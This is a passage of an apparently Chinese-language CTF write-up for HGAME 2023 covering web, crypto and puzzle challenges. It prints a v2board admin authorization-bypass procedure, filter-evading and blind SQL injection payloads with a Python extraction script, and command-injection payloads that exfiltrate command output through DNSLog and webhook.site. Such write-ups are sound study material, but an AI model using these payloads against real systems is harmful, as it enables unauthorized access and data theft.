http://week-2.hgame.lwsec.cn:32140/.git</code></p><p>得到文件Th1s_1s-flag</p><p><code>hgame&#123;Don't^put*Git-in_web_directory&#125;</code></p><h3 id="v2board"><a class="markdownIt-Anchor" href="#v2board"></a> v2board</h3><p>需要越权获得admin的权限，查看admin订阅的token</p><p>先随便注册个邮箱进去看看，都没有什么有用的信息</p><p>猜测是v2board的漏洞，查看源码知道是1.6.1版本的</p><p>上网搜<a href="https://www.ctfiot.com/86202.html">v2board越权访问漏洞</a></p><p>这里的漏洞是</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis">鉴权方式变为从Redis中获取缓存判定是否存在可以调用接口，导致任意用户都可以调用管理员权限的接口获取后台权限<br> <span class="hljs-literal">Admin</span>.php 文件中只验证了 authrization 是否在 Redis的缓存中，所以当注册任意一个用户进行登陆后获取到 auth_data 就可以任意调用 管理员的接口<br></code></pre></td></tr></table></figure><p>先随意注册一个邮箱</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">email:<span class="hljs-keyword">admin</span>@qq.com<br><span class="hljs-keyword">password</span>:<span class="hljs-keyword">admin</span>@qq.com<br></code></pre></td></tr></table></figure><p>登录后会返回一个auth_data字段<code>YWRtaW4xMjNAcXEuY29tOiQyeSQxMCQ4aU1wd2pPZWx2aUlMQS8yVE9SWHhPSEc3TDVaUkJjWWpvdnJZS2ZvNDdmM012cHR3eUplMg==</code></p><p>然后访问/api/v1/admin/user/fetch ,并在请求头加上<code>authorization:YWRtaW4xMjNAcXEuY29tOiQyeSQxMCQ4aU1wd2pPZWx2aUlMQS8yVE9SWHhPSEc3TDVaUkJjWWpvdnJZS2ZvNDdmM012cHR3eUplMg==</code>,</p><p>访问得到</p><img src="/2023/01/05/HGAME/9.png" class=""><p>可以发现有一个<code>admin@example.com</code>不是我们注册的，那就是admin了，订阅链接的token=<code>39d580e71705f6abac9a414def74c466</code></p><h3 id="search-commodity"><a class="markdownIt-Anchor" href="#search-commodity"></a> Search Commodity</h3><p>弱密码爆破<code>admin123</code></p><p>接下来就是sql注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1/*/**/*/oorrder/*/**/*/by/*/**/*/3%23<br>0/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,datadatabasebase(),3%23   se4rch<br>0/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,(seselectlect/*/**/*/group_concat(table_name)frfromom/*/**/*/infoorrmation_schema.tables/*/**/*/whwhereere/*/**/*/table_schema/*/**/*/like/*/**/*/&#x27;se4rch&#x27;),3%23   5ecret15here,L1st,user1nf0<br>0/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,(seselectlect/*/**/*/group_concat(column_name)frfromom/*/**/*/infoorrmation_schema.columns/*/**/*/whwhereere/*/**/*/table_name/*/**/*/like/*/**/*/&#x27;5ecret15here&#x27;),3%23f14gggg1shere<br>0/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,(seselectlect/*/**/*/group_concat(f14gggg1shere)frfromom/*/**/*/5ecret15here),3%23   hgame&#123;4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!&#125;<br></code></pre></td></tr></table></figure><h3 id="rabin"><a class="markdownIt-Anchor" href="#rabin"></a> Rabin</h3><p>Rabin加密方案：<br />选择两个大素数p和q做为私钥</p><p>计算n = p * q做为公钥</p><p>若明文为m，则密文为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>≡</mo><msup><mi>m</mi><mn>2</mn></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c ≡ m^{2}(mod n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><p>实际做题中，加密指数e不仅限于2，所有和n不互素的都有可能</p><p>加密算法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_key</span>(<span class="hljs-params">kbits</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = getPrime(kbits)<br>        q = getPrime(kbits)<br>        <span class="hljs-keyword">if</span> p % <span class="hljs-number">4</span> == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> q % <span class="hljs-number">4</span>== <span class="hljs-number">3</span>:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> p, q<br><br>p ,q = gen_key(<span class="hljs-number">256</span>)<br>flag =  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>pt = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(pt, <span class="hljs-number">2</span>, p*q)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p=<span class="hljs-subst">&#123;p&#125;</span>\nq=<span class="hljs-subst">&#123;q&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c=<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:]&#125;</span>&quot;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">p=65428327184555679690730137432886407240184329534772421373193521144693375074983</span><br><span class="hljs-string">q=98570810268705084987524975482323456006480531917292601799256241458681800554123</span><br><span class="hljs-string">c=4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><p>使用<a href="https://sagecell.sagemath.org/">sagemath</a>求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">p =<span class="hljs-number">65428327184555679690730137432886407240184329534772421373193521144693375074983</span><br>q =<span class="hljs-number">98570810268705084987524975482323456006480531917292601799256241458681800554123</span><br>c =<span class="hljs-number">0x4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556</span><br>e = <span class="hljs-number">2</span><br>R.&lt;x&gt; = Zmod(p)[] <span class="hljs-comment">#将x作为需要求得的未知数，p为素数</span><br>f = x^e-c<br>r1 = [<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.roots()] <span class="hljs-comment">#f.roots()返回求解出来的所有解的列表</span><br>R.&lt;x&gt; = Zmod(q)[]<br>f = x^e-c<br>r2 = [<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.roots()]<br>m = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> r1:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> r2:<br>        m.append(crt([i,j],[p,q])) <span class="hljs-comment">#crt求解中国剩余定理，第一个参数为余数列表，第二个参数为模数列表</span><br><span class="hljs-built_in">print</span>(m) <span class="hljs-comment">#将所有可能的m输出，复制到python里long_to_bytes()</span><br><br></code></pre></td></tr></table></figure><p>到Python中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>flag=[<span class="hljs-number">2372237455851842898349117425227584430588749791480564189568122389688124352290664541063989455711371754963358673223097609351443007448201859216160320647129068</span>, <span class="hljs-number">202822073494981439416400155064048668390596366869305553433016288033759387909443994349181</span>, <span class="hljs-number">6449323225107597053933443750923454260964062647115639999185223478236408615216462580775151285384372189740266233875418656692511620093103204244355042080455728</span>, <span class="hljs-number">4077085769255754155584326325695869830375312855635075809617101088548487084999293021150578229828064483445298157019190352894501628932935104416104165427675841</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(long_to_bytes(i))<br></code></pre></td></tr></table></figure><p><code>hgame&#123;That'5_s0_3asy_to_s@lve_r@bin&#125;</code></p><h3 id="rsa-大冒险1"><a class="markdownIt-Anchor" href="#rsa-大冒险1"></a> RSA 大冒险1</h3><p>4关挑战，通过拿flag</p><p>直接上解题代码</p><p>challenge 1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>c=<span class="hljs-number">0x56908e6a818ea207ac312c0b204d94ee651cd7b26313fbfdcfb2406828ad379fa12529cf3db2a4d903</span><br>n=<span class="hljs-number">209770295744242916299788862153266483138979976716588739416239543100484342323180172904935777216735461</span><br>p=<span class="hljs-number">333053352923682535111489833655011123013</span><br>e = <span class="hljs-number">65537</span><br><br>d = libnum.invmod(e, (p-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c, d, p)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br><br><span class="hljs-comment">#m&lt;n_But_also_m&lt;p</span><br></code></pre></td></tr></table></figure><p>challenge 2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> math<br><br>c1 = <span class="hljs-number">0xa757143e3ea0753ac3c15e0dd05bc6eb58bdf947203c321417fb2739a9072ee5969b7ae017bb68c46969ceddccb0b3e8e27f0b79ba011065e9e0c0d6ec04c7735bc7d2d3d55119f3852c78264c40c9b36fffbc8741515d6d43f4aeba50186ceb45952617d8f4d15e0c0e84397d58aad6b9d8df15adc1f29c4c37addfb6f901d</span><br>c2 = <span class="hljs-number">0xca21ea2228e901614120f89036e62c36f385343c9b15a43c47d23097bb6eb6df4cc6aac315f283b35bf3e00612fea7ee2711248615c10b61475e96f57a94ecfb49b1b60495353c6232510e995251c6a3744193f0e3c10bc1cb9f8bbab19b7cd2a67fab178ca7fe6263aa22c460b0b51af14c9dc2adbe6aa9539e05b214dc1bf</span><br>n1 = <span class="hljs-number">99117167225742621252747360705927288427226074291111147359767727530232979959246961303002594953502494314944737381744946594792258965951764387793904602632138990093085873703735789929744541078195532792040220263365256453293757661668916687151993893223835585293806890903078811527485480385874789904018025085480072921947</span><br>n2 = <span class="hljs-number">90708232882117493164546448126493812176926972474525609918179199222944319390160880291246879414964890005116911514705462257621255399480873008530781044973928567730151038933999620333681189161328502592514982955942546631546678204758589280772127887941509353870320299744541746637191024740549289281821158392283041483783</span><br>p = math.gcd(n1, n2)<br>e = <span class="hljs-number">65537</span><br>d = libnum.invmod(e, (p - <span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c1, d, p)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br><span class="hljs-comment">#make_all_modulus_independent</span><br></code></pre></td></tr></table></figure><p>challenge 3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br>n = <span class="hljs-number">114515838473805006712847594704380677940280499969617865451903741803970304896753055873744402239365107537263730326351655179037631201887020732179784578687179230556396662015803684388855028443206818232761239630564571111262306517782298740762072717669765284942698987218518593869320732633953301487410854175666320988421</span><br>e = <span class="hljs-number">3</span><br>c = <span class="hljs-number">0xfec61958cefda3eb5f709faa0282bffaded0a323fe1ef370e05ed3744a2e53b55bdd43e9594427c35514505f26e4691ba86c6dcff6d29d69110b15b9f84b0d8eb9ea7c03aaf24fa957314b89febf46a615f81ec031b12fe725f91af9d269873a69748</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">200000000</span>):<br>    <span class="hljs-keyword">if</span> gmpy2.iroot(c + n * i, <span class="hljs-number">3</span>)[<span class="hljs-number">1</span>] == <span class="hljs-number">1</span>:<br>        res = gmpy2.iroot(c + n * i, <span class="hljs-number">3</span>)[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(i, res)<br>        <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(res)))<br>        <span class="hljs-keyword">break</span><br>   <br><span class="hljs-comment">#encrypt_exponent_should_be_bigger</span><br></code></pre></td></tr></table></figure><p>challenge 4</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#共模攻击</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> libnum<br><br>n = <span class="hljs-number">82359994555957061700863027886322811457676109608256083872064055426219259168794095530809575147825700925031273940545355557102788577532782300265260138429958167909187144110770618006792214374768047428973415244582649583493180328548963991180770977787901825467721537824736537797481709634514539903832239828285924506839</span><br>e1 = <span class="hljs-number">108289</span><br>e2 = <span class="hljs-number">81013</span><br>s = gcdext(e1, e2)<br>s1 = s[<span class="hljs-number">1</span>]<br>s2 = -s[<span class="hljs-number">2</span>]<br><br>c1 = <span class="hljs-number">0x64d0825cadb4374aec113fcac2d752bb71d4586a9bb02b6d82f76fda0b642af037447b9cf76f80b1f4066bcf94dd6538b253a02aaa8f956edbd20c2a2f311b1f554ff7f968f124a8472d6d5306d9c96e16b737ee5675061e4de58bc6b5fb7f3cc5f92647c6aba9010b03b2c5d4d28b031d77205bc238b19785783e80e3a9146d</span><br>c2 = <span class="hljs-number">0x1eed249f0b99aa87992b59387ec11a0b36022aa475c3917d6a85c36745c5d0e7275c16e9879e2192491783533941b50cd97a0f4f32803df7118288c89f4e22555ca98d0417063dbb81c60e2d1a2e696bcec16660cd396aaf9b5743c1944b28adb33f73f70f3aa5fed5cd2cef0c9920dd54e68b34f40fe31e3662f1d9d484fff3</span><br><span class="hljs-comment"># e2=9647291</span><br>c2 = invert(c2, n)<br>m = (<span class="hljs-built_in">pow</span>(c1, s1, n) * <span class="hljs-built_in">pow</span>(c2, s2, n)) % n<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br><span class="hljs-comment">#never_uese_same_modulus</span><br></code></pre></td></tr></table></figure><p><code>hgame&#123;W0w_you^knowT^e_CoMm0n_&amp;t$ack_@bout|RSA&#125;</code></p><h3 id="包里有什么"><a class="markdownIt-Anchor" href="#包里有什么"></a> 包里有什么</h3><p>看了官方wp，发现想多了，不需要求长度和w</p><p>根据扩展的欧几里得算法直接可以求出w的逆元</p><img src="/2023/01/05/HGAME/17.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> gcdext<br>m = <span class="hljs-number">1528637222531038332958694965114330415773896571891017629493424</span><br>b0 = <span class="hljs-number">69356606533325456520968776034730214585110536932989313137926</span><br>c = <span class="hljs-number">93602062133487361151420753057739397161734651609786598765462162</span><br>winv = gcdext(b0, m)[<span class="hljs-number">1</span>]<br>v = c * winv % m &gt;&gt; <span class="hljs-number">1</span>    <span class="hljs-comment">#乘上w的逆元再除以2</span><br>flag = <span class="hljs-string">&#x27;hgame&#123;&#x27;</span> + long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">bin</span>(v)[<span class="hljs-number">2</span>:][::-<span class="hljs-number">1</span>], <span class="hljs-number">2</span>)).decode() + <span class="hljs-string">&#x27;&#125;&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#hgame&#123;1t&#x27;s_4n_3asy_ba9_isn7_it?&#125;</span><br></code></pre></td></tr></table></figure><h3 id="sign-in-pro-max"><a class="markdownIt-Anchor" href="#sign-in-pro-max"></a> Sign In Pro Max</h3><p>附件如下</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">Part1, <span class="hljs-keyword">is</span> seems like baseXX: QVl5Y3BNQjE1ektibnU3SnN6M0tGaQ==<br>Part2, a hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">with</span> <span class="hljs-number">128</span><span class="hljs-built_in">bit</span> digest size <span class="hljs-keyword">and</span> <span class="hljs-number">512</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size: c629d83ff9804fb62202e90b0945a323<br>Part3, a hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">with</span> <span class="hljs-number">160</span><span class="hljs-built_in">bit</span> digest size <span class="hljs-keyword">and</span> <span class="hljs-number">512</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size: <span class="hljs-number">99</span>f3b3ada2b4675c518ff23cbd9539da05e2f1f8<br>Part4, the <span class="hljs-keyword">next</span> generation hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">of</span> part3 <span class="hljs-keyword">with</span> <span class="hljs-number">256</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size <span class="hljs-keyword">and</span> <span class="hljs-number">64</span> rounds: <span class="hljs-number">1838</span>f8d5b547c012404e53a9d8c76c56399507a2b017058ec7f27428fda5e7db<br>Ufwy5 nx <span class="hljs-number">0</span>gh0jf61i21h, stb uzy fqq ymj ufwyx ytljymjw, its<span class="hljs-symbol">&#x27;y</span> ktwljy ymj ktwrfy.<br></code></pre></td></tr></table></figure><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">Part1是base加密：base32+base58+base64f51d3a18<br>Part2,a hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">with</span> <span class="hljs-number">128</span><span class="hljs-built_in">bit</span> digest size <span class="hljs-keyword">and</span> <span class="hljs-number">512</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size 是md5f91c<br>Part3,a hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">with</span> <span class="hljs-number">160</span><span class="hljs-built_in">bit</span> digest size <span class="hljs-keyword">and</span> <span class="hljs-number">512</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size 是sha-<span class="hljs-number">1</span><span class="hljs-number">4952</span><br>Part4,the <span class="hljs-keyword">next</span> generation hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">of</span> part3是sha-<span class="hljs-number">2</span>，<span class="hljs-number">256</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size <span class="hljs-keyword">and</span> <span class="hljs-number">64</span> rounds是sha-<span class="hljs-number">256</span>a3ed<br>最后一句是凯撒加密，位移<span class="hljs-number">5</span>，Part5 <span class="hljs-keyword">is</span> <span class="hljs-number">0</span>bc0ea61d21c, now put <span class="hljs-keyword">all</span> the parts together, don<span class="hljs-symbol">&#x27;t</span> forget the format<br></code></pre></td></tr></table></figure><p>以为flag就是hgame{f51d3a18f91c4952a3ed0bc0ea61d21c}</p><p>结果交上去是错的，发现part5后面还有一句don’t forget format,尝试每部分之间加<code>_</code>,发现还是错误，换成<code>-</code>就对了</p><p><code>hgame&#123;f51d3a18-f91c-4952-a3ed-0bc0ea61d21c&#125;</code></p><h2 id="week-3"><a class="markdownIt-Anchor" href="#week-3"></a> Week 3</h2><h3 id="login-to-get-my-gift"><a class="markdownIt-Anchor" href="#login-to-get-my-gift"></a> Login To Get My Gift</h3><p>测试一下，只显示<code>Success</code>,<code>Fail</code>,<code>SQL Injection Detected</code>,应该是盲注</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://week-3.hgame.lwsec.cn:31480/login&#x27;</span><br>cookie = &#123;<span class="hljs-string">&#x27;_ga_P1E9Z5LRRK&#x27;</span>: <span class="hljs-string">&#x27;GS1.1.1673534407.1.1.1673534578.0.0.0&#x27;</span>, <span class="hljs-string">&#x27;_ga&#x27;</span>: <span class="hljs-string">&#x27;GA1.1.690589002.1673534407&#x27;</span>&#125;<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">128</span>):<br>        payload = <span class="hljs-string">&quot;0&#x27;/**/or/**/ascii(right(left((select/**/concat_ws(0x7e,PAssw0rD)/**/from/**/User1nf0mAt1on/**/limit/**/0,1),&#123;0&#125;),1))/**/regexp/**/&#123;1&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i+<span class="hljs-number">1</span>,j)<br>        <span class="hljs-built_in">print</span>(payload)<br>        data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>: payload, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-number">1</span>&#125;<br>        rsp = requests.post(url=url, data=data, cookies=cookie)<br>        <span class="hljs-comment">#print(rsp.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Success!&#x27;</span> <span class="hljs-keyword">in</span> rsp.text:<br>            flag+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mysql">0&#x27;/**/or/**/length((database()))&lt;8/**/#数据库长度7<br>0&#x27;/**/or/**/ascii(right(left(database(),&#123;0&#125;),1))/**/regexp/**/&#123;1&#125;/**/#.format(i,j)数据库名L0g1NMe<br>0&#x27;/**/or/**/length(((select/**/concat_ws(0x7e,table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/regexp/**/database()/**/limit/**/0,1)))&gt;1/**/#只有一个表<br>0&#x27;/**/or/**/length(((select/**/concat_ws(0x7e,table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/regexp/**/database()/**/limit/**/0,1)))&lt;15/**/#表名长度为14<br>0&#x27;/**/or/**/ascii(right(left((select/**/concat_ws(0x7e,table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/regexp/**/database()/**/limit/**/0,1),&#123;0&#125;),1))/**/regexp/**/&#123;1&#125;#&quot;.format(i+1,j)表名User1nf0mAt1on<br>0&#x27;/**/or/**/length(((select/**/concat_ws(0x7e,column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/regexp/**/&#x27;User1nf0mAt1on&#x27;/**/limit/**/2,1)))&gt;1/**/#列数 3列<br><br>0&#x27;/**/or/**/ascii(right(left((select/**/concat_ws(0x7e,column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/regexp/**/&#x27;User1nf0mAt1on&#x27;/**/limit/**/0,1),1),1))/**/&gt;/**/100#<br>第一列长度2 id 第二列长度8 PAssw0rD第三列长度8UsErN4me<br><br>0&#x27;/**/or/**/ascii(right(left((select/**/concat_ws(0x7e,UsErN4me)/**/from/**/User1nf0mAt1on/**/limit/**/0,1),&#123;0&#125;),1))/**/regexp/**/&#123;1&#125;#&quot;.format(i+1,j)<br>1WeLc0meT0hgAmE2023hAPPySqlhgAmE2023HAppYnEwyEAr<br></code></pre></td></tr></table></figure><p>拿到管理员的用户名和密码，访问/home得到flag</p><p><code>hgame&#123;It_1s_1n7EresT1nG_T0_ExPL0Re_Var10us_Ways_To_Sql1njEct1on&#125;</code></p><h3 id="ping-to-the-host"><a class="markdownIt-Anchor" href="#ping-to-the-host"></a> Ping To The Host</h3><p>一看RCE,马上试一下127.0.0.1|ls ，结果无回显。。。。</p><p>试了几个无回显RCE，发现DNS带外和http带外可以用，不过还是有点小坑</p><p>payload1:DNS带外</p><p>在<a href="http://www.dnslog.cn/">DNSLog</a>注册一个临时的DNS</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>|ping$IFS$<span class="hljs-number">9</span>`whoami`.<span class="hljs-number">7</span>n17xh.dnslog.cn<br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>|ping$IFS$<span class="hljs-number">9</span>`head$IFS$<span class="hljs-number">9</span>/f*`.<span class="hljs-number">7</span>n17xh.dnslog.cn<br></code></pre></td></tr></table></figure><img src="/2023/01/05/HGAME/18.png" class=""><p>payload2:http带外</p><p>在<a href="https://webhook.site/">webhook</a>生成一个临时网站来接受请求查看回显</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>|curl$IFS$<span class="hljs-number">9</span>https://webhook.site/<span 